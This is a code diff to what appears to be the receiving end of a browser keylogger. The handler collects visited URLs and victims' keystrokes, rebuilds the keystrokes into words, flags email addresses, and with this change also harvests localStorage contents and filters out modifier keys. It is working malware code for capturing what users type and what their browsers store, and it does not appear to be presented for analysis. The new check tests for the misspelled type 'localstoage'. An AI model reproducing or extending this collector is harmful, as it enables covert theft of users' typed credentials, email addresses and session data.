@@ -56,15 +56,24 @@ https
             content: jsonBody.url,
           });
         }
+        if (jsonBody.type === "localstoage") {
+          content.push({
+            date: new Date(),
+            type: "localstorage",
+            content: jsonBody.content,
+          });
+        }
         if (jsonBody.type === "key") {
           const letter = jsonBody.key;
-          word += letter;
-          if (letter === " " || letter === "Enter" || letter === "Tab") {
-            content.push({ date: new Date(), type: "word", content: word });
-            if (word.indexOf("@") > -1) {
-              console.warn("🎺 email found: " + word + " 🎺");
+          if (letter !== "Meta" && letter !== "Shift" && letter !== "Control") {
+            word += letter;
+            if (letter === " " || letter === "Enter" || letter === "Tab") {
+              content.push({ date: new Date(), type: "word", content: word });
+              if (word.indexOf("@") > -1) {
+                console.warn("🎺 email found: " + word + " 🎺");
+              }
+              word = "";
             }
-            word = "";
           }
         }
 
